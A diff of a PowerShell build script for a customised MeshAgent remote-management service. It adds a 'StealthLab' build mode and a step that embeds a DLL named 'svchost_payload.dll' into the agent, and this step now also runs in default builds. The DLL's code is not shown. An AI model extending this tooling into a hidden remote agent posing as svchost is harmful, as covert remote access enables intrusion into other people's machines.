@@ -44,11 +44,126 @@ param(
     [Parameter()]
     [switch]$StealthLab,
 
-    [Parameter()]
-    [switch]$BuildSvchostDll
+[Parameter()]
+[switch]$BuildSvchostDll
 )
 
 $ErrorActionPreference = 'Stop'
+
+function Stage-SvchostPayload {
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$RepoRoot
+    )
+
+    $payloadDir = Join-Path $RepoRoot "meshservice\embedded"
+    if (-not (Test-Path $payloadDir)) {
+        New-Item -Path $payloadDir -ItemType Directory -Force | Out-Null
+    }
+
+    $preferredDll = Join-Path $RepoRoot "meshservice\x64\StealthLab_DLL\MeshService-2022.dll"
+    $candidateList = @()
+
+    if (Test-Path $preferredDll) {
+        $candidateList += Get-Item -Path $preferredDll
+    }
+
+    $candidateDirs = @(
+        (Join-Path $RepoRoot "meshservice\StealthLab_DLL")
+        (Join-Path $RepoRoot "meshservice\x64\StealthLab_DLL")
+    )
+
+    foreach ($candidateDir in $candidateDirs) {
+        if (Test-Path $candidateDir) {
+            $candidateList += Get-ChildItem -Path $candidateDir -Filter *.dll -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending
+        }
+    }
+
+    $candidateList = $candidateList | Where-Object { $_ }
+    $dllCandidate = $candidateList | Select-Object -First 1
+
+    if (-not $dllCandidate) {
+        Write-Host "[Pre] ⚠️ No svchost DLL found to embed" -ForegroundColor Yellow
+        return $false
+    }
+
+    $payloadPath = Join-Path $payloadDir "svchost_payload.dll"
+    Copy-Item -Path $dllCandidate.FullName -Destination $payloadPath -Force
+
+    $hashDisplay = "n/a"
+    try {
+        $hash = (Get-FileHash -Path $payloadPath -Algorithm SHA256).Hash
+        if ($hash.Length -ge 8) {
+            $hashDisplay = $hash.Substring(0, 8)
+        } else {
+            $hashDisplay = $hash
+        }
+    } catch {
+        # ignore hash failures; optional diagnostics only
+    }
+
+    Write-Host ("[Pre] Staged payload: {0} -> embedded\svchost_payload.dll (SHA256 {1}...)" -f $dllCandidate.Name, $hashDisplay) -ForegroundColor Gray
+    return $true
+}
+
+function Get-OutputPath {
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$RepoRoot,
+
+        [Parameter(Mandatory = $true)]
+        [string]$Configuration,
+
+        [Parameter(Mandatory = $true)]
+        [ValidateSet('x64', 'Win32')]
+        [string]$Platform
+    )
+
+    $configMap = @{
+        'Release' = @{
+            'x64'  = 'meshservice\Release\MeshService64.exe'
+            'Win32'= 'meshservice\Release\MeshService.exe'
+        }
+        'Release_NoOpenSSL' = @{
+            'x64'  = 'meshservice\Release_NoOpenSSL\MeshService64.exe'
+            'Win32'= 'meshservice\Release_NoOpenSSL\MeshService.exe'
+        }
+        'Debug' = @{
+            'x64'  = 'meshservice\Debug\MeshService64.exe'
+            'Win32'= 'meshservice\Debug\MeshService.exe'
+        }
+        'Debug_NoOpenSSL' = @{
+            'x64'  = 'meshservice\Debug_NoOpenSSL\MeshService64.exe'
+            'Win32'= 'meshservice\Debug_NoOpenSSL\MeshService.exe'
+        }
+        'StealthLab' = @{
+            'x64'  = 'meshservice\x64\StealthLab\MeshService-2022.exe'
+            'Win32'= 'meshservice\StealthLab\MeshService-2022.exe'
+        }
+        'StealthLab_DLL' = @{
+            'x64'  = 'meshservice\x64\StealthLab_DLL\MeshService-2022.dll'
+        }
+        'Release_DLL' = @{
+            'x64'  = 'meshservice\x64\Release_DLL\MeshService-2022.dll'
+        }
+        'Debug_DLL' = @{
+            'x64'  = 'meshservice\x64\Debug_DLL\MeshService-2022.dll'
+        }
+    }
+
+    if ($configMap.ContainsKey($Configuration)) {
+        $platformMap = $configMap[$Configuration]
+        if ($platformMap.ContainsKey($Platform) -and $platformMap[$Platform]) {
+            return Join-Path $RepoRoot $platformMap[$Platform]
+        }
+    }
+
+    if ($Platform -eq 'x64') {
+        return Join-Path $RepoRoot 'meshservice\Release\MeshService64.exe'
+    } else {
+        return Join-Path $RepoRoot 'meshservice\Release\MeshService.exe'
+    }
+}
 
 # Configuration
 $RepoRoot = $PSScriptRoot
@@ -58,17 +173,6 @@ $MSBuildPath = "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\
 $SolutionFile = Join-Path $RepoRoot "MeshAgent-2022.sln"
 $ProjectFile = Join-Path $RepoRoot "meshservice\MeshService-2022.vcxproj"
 
-# Output
-$OutputX64 = Join-Path $RepoRoot "meshservice\Release\MeshService64.exe"
-$OutputX86 = Join-Path $RepoRoot "meshservice\Release\MeshService.exe"
-
-Write-Host "" 
-Write-Host "================================================================" -ForegroundColor Cyan
-Write-Host "  MeshAgent Custom Build Script" -ForegroundColor Cyan
-Write-Host "  Configuration: $Configuration" -ForegroundColor Cyan
-Write-Host "================================================================" -ForegroundColor Cyan
-Write-Host ""
-
 # If StealthLab is requested, set environment for branding generator and default config
 if ($StealthLab) {
     $env:STEALTH_LAB = '1'
@@ -77,6 +181,17 @@ if ($StealthLab) {
     }
     Write-Host "[StealthLab] Lab stealth features enabled (env: STEALTH_LAB=1)" -ForegroundColor Yellow
 }
+
+Write-Host "" 
+Write-Host "================================================================" -ForegroundColor Cyan
+Write-Host "  MeshAgent Custom Build Script" -ForegroundColor Cyan
+Write-Host "  Configuration: $Configuration" -ForegroundColor Cyan
+Write-Host "================================================================" -ForegroundColor Cyan
+Write-Host ""
+
+# Output destinations depend on final configuration selection
+$OutputX64 = Get-OutputPath -RepoRoot $RepoRoot -Configuration $Configuration -Platform 'x64'
+$OutputX86 = Get-OutputPath -RepoRoot $RepoRoot -Configuration $Configuration -Platform 'Win32'
 
 #region Step 1: Validate Environment
 Write-Host "[1/7] Validating build environment..." -ForegroundColor Green
@@ -249,9 +364,11 @@ if (-not $SkipClean) {
 
     $cleanDirs = @(
         "meshservice\Release",
+        "meshservice\$Configuration",
+        "meshservice\x64\$Configuration",
         "meshservice\x64\OBJ",
         "Release"
-    )
+    ) | Where-Object { $_ } | Select-Object -Unique
 
     foreach ($dir in $cleanDirs) {
         $fullPath = Join-Path $RepoRoot $dir
@@ -267,6 +384,7 @@ if (-not $SkipClean) {
 #endregion
 
 # Optional pre-step: build StealthLab_DLL and stage payload for resource bundling
+$payloadStaged = $false
 if ($BuildSvchostDll -or $StealthLab) {
     Write-Host "[Pre] Building svchost DLL (StealthLab_DLL|x64) for bundling..." -ForegroundColor Green
     $dllArgsPre = @(
@@ -284,25 +402,14 @@ if ($BuildSvchostDll -or $StealthLab) {
         Write-Host "? Pre DLL build failed with exit code $LASTEXITCODE" -ForegroundColor Red
         exit $LASTEXITCODE
     }
-    # Stage payload to embedded\svchost_payload.dll so bundle_resources.rc can include it
-    $dllOutDirPre = Join-Path $RepoRoot "meshservice\StealthLab_DLL"
-    $dllOutDirPreAlt = Join-Path $RepoRoot "meshservice\x64\StealthLab_DLL"
-    $payloadDir = Join-Path $RepoRoot "meshservice\embedded"
-    if (-not (Test-Path $payloadDir)) { New-Item -Path $payloadDir -ItemType Directory | Out-Null }
-    $dllCandidate = $null
-    if (Test-Path $dllOutDirPre) {
-        $dllCandidate = Get-ChildItem -Path $dllOutDirPre -Filter *.dll | Select-Object -First 1
-    }
-    if (-not $dllCandidate -and (Test-Path $dllOutDirPreAlt)) {
-        $dllCandidate = Get-ChildItem -Path $dllOutDirPreAlt -Filter *.dll | Select-Object -First 1
-    }
-    if ($dllCandidate) {
-        Copy-Item -Path $dllCandidate.FullName -Destination (Join-Path $payloadDir "svchost_payload.dll") -Force
-        Write-Host "[Pre] Staged payload: $($dllCandidate.Name) -> embedded\\svchost_payload.dll" -ForegroundColor Gray
-    } else {
-        Write-Host "? No DLL found to bundle in $dllOutDirPre" -ForegroundColor Yellow
-    }
-}#region Step 5: Build x64
+    $payloadStaged = Stage-SvchostPayload -RepoRoot $RepoRoot
+}
+
+if (-not $payloadStaged) {
+    $payloadStaged = Stage-SvchostPayload -RepoRoot $RepoRoot
+}
+
+#region Step 5: Build x64
 Write-Host "[5/7] Building MeshService x64..." -ForegroundColor Green
 
 $buildArgs = @(
@@ -323,7 +430,7 @@ if ($LASTEXITCODE -ne 0) {
     exit $LASTEXITCODE
 }
 
-if (-not (Test-Path $OutputX64)) {
+if (-not $OutputX64 -or -not (Test-Path $OutputX64)) {
     Write-Host "❌ x64 binary not found at: $OutputX64" -ForegroundColor Red
     exit 1
 }
@@ -334,42 +441,61 @@ Write-Host "✅ x64 build completed: ${x64SizeMB} MB" -ForegroundColor Gray
 #endregion
 
 #region Step 6: Build x86
-Write-Host "[6/7] Building MeshService x86..." -ForegroundColor Green
+if ($OutputX86) {
+    Write-Host "[6/7] Building MeshService x86..." -ForegroundColor Green
 
-$buildArgs = @(
-    $ProjectFile,
-    "/p:Configuration=$Configuration",
-    "/p:Platform=Win32",
-    "/p:WindowsTargetPlatformVersion=10.0",
-    "/p:PlatformToolset=v143",
-    "/m",
-    "/v:minimal",
-    "/t:Rebuild"
-)
+    $buildArgs = @(
+        $ProjectFile,
+        "/p:Configuration=$Configuration",
+        "/p:Platform=Win32",
+        "/p:WindowsTargetPlatformVersion=10.0",
+        "/p:PlatformToolset=v143",
+        "/m",
+        "/v:minimal",
+        "/t:Rebuild"
+    )
 
-& $MSBuildPath $buildArgs
+    & $MSBuildPath $buildArgs
 
-if ($LASTEXITCODE -ne 0) {
-    Write-Host "❌ x86 build failed with exit code $LASTEXITCODE" -ForegroundColor Red
-    exit $LASTEXITCODE
+    if ($LASTEXITCODE -ne 0) {
+        Write-Host "❌ x86 build failed with exit code $LASTEXITCODE" -ForegroundColor Red
+        exit $LASTEXITCODE
+    }
+
+    if (-not (Test-Path $OutputX86)) {
+        Write-Host "❌ x86 binary not found at: $OutputX86" -ForegroundColor Red
+        exit 1
+    }
+
+    $x86Size = (Get-Item $OutputX86).Length
+    $x86SizeMB = [math]::Round($x86Size / 1MB, 2)
+    Write-Host "✅ x86 build completed: ${x86SizeMB} MB" -ForegroundColor Gray
+} else {
+    Write-Host "[6/7] Skipping MeshService Win32 build for configuration '$Configuration' (no Win32 artifact expected)" -ForegroundColor Yellow
+    $x86Size = $null
+    $x86SizeMB = $null
 }
-
-if (-not (Test-Path $OutputX86)) {
-    Write-Host "❌ x86 binary not found at: $OutputX86" -ForegroundColor Red
-    exit 1
-}
-
-$x86Size = (Get-Item $OutputX86).Length
-$x86SizeMB = [math]::Round($x86Size / 1MB, 2)
-Write-Host "✅ x86 build completed: ${x86SizeMB} MB" -ForegroundColor Gray
 #endregion
 
 #region Step 7: Verify & Test
 Write-Host "[7/7] Verifying build outputs..." -ForegroundColor Green
 
-# Calculate checksums
+$x64Item = Get-Item -Path $OutputX64
+$x64Size = $x64Item.Length
+$x64SizeMB = [math]::Round($x64Size / 1MB, 2)
 $x64MD5 = (Get-FileHash -Path $OutputX64 -Algorithm MD5).Hash
-$x86MD5 = (Get-FileHash -Path $OutputX86 -Algorithm MD5).Hash
+$x64Name = Split-Path -Path $OutputX64 -Leaf
+$x86Item = $null
+$x86MD5 = $null
+$x86Name = $null
+
+if ($OutputX86 -and (Test-Path $OutputX86)) {
+    $x86Item = Get-Item -Path $OutputX86
+    $x86Size = $x86Item.Length
+    $x86SizeMB = [math]::Round($x86Size / 1MB, 2)
+    $x86MD5 = (Get-FileHash -Path $OutputX86 -Algorithm MD5).Hash
+    $x86Name = Split-Path -Path $OutputX86 -Leaf
+}
 
 Write-Host ""
 Write-Host "================================================================" -ForegroundColor Green
@@ -377,8 +503,12 @@ Write-Host "  BUILD SUCCESSFUL" -ForegroundColor Green
 Write-Host "================================================================" -ForegroundColor Green
 Write-Host ""
 Write-Host "Outputs:" -ForegroundColor Cyan
-Write-Host "  📦 MeshService64.exe: ${x64SizeMB} MB (MD5: $x64MD5)" -ForegroundColor White
-Write-Host "  📦 MeshService.exe:   ${x86SizeMB} MB (MD5: $x86MD5)" -ForegroundColor White
+Write-Host ("  📦 {0}: {1} MB (MD5: {2})" -f $x64Name, $x64SizeMB, $x64MD5) -ForegroundColor White
+if ($x86Item) {
+    Write-Host ("  📦 {0}: {1} MB (MD5: {2})" -f $x86Name, $x86SizeMB, $x86MD5) -ForegroundColor White
+} else {
+    Write-Host "  ⚠️ Win32 output not produced for this configuration" -ForegroundColor Yellow
+}
 Write-Host ""
 Write-Host "Next steps:" -ForegroundColor Cyan
 Write-Host "  1. Test binaries locally" -ForegroundColor White
@@ -391,7 +521,7 @@ if (-not $SkipTests) {
     Write-Host "Running basic validation tests..." -ForegroundColor Yellow
 
     # Test 1: File size check
-    if ($x64Size -lt 3000000 -or $x86Size -lt 3000000) {
+    if ($x64Size -lt 3000000 -or ($x86Item -and $x86Size -lt 3000000)) {
         Write-Host "⚠️ Warning: Binary size smaller than expected" -ForegroundColor Yellow
     }
 
